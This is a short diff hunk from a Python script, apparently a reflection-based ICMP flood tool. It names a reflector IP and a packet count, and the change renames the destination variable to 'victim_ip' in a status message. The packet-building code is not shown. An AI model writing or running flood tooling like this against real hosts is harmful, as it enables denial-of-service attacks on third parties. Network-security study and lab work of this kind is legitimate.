@@ -21,7 +21,7 @@ reflector_ip = "192.168.168.13" # reflector ip
 num_packets = 100 # number of packets to send
 
 def main():
-    print(f"Starting ICMP flood: \nSending {num_packets} to {dest_ip}..")
+    print(f"Starting ICMP flood: \nSending {num_packets} to {victim_ip}..")
 
     for i in range(num_packets):
         random_seq = random.randint(0, 65535) # both seq and id are 16-bit range
